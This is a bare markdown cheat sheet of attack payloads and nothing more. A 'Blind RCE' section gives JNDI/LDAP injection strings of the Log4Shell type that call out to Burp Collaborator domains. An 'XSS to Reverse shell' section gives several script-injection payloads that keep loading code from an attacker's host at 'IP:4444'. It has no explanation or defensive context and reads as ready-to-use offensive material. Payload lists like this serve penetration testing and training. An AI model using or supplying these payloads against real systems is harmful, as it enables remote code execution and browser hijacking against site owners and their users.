## Blind RCE:
``
${jndi:ldap://${command}XXXX${::-.}burpcollab.net}zzzz

${jndi:ldap://${command}XXXX${::-.}99gabkspyjhuqr69989p8ivwun0eo3.burpcollaborator.net}zzzz
```
## XSS to Reverse shell:
```
<svg/onlaod=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>

<script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)</script>

<img src=link onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>

<body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}}></body>

<img src=x onerror=document.write(navigator.appVersion)>
```
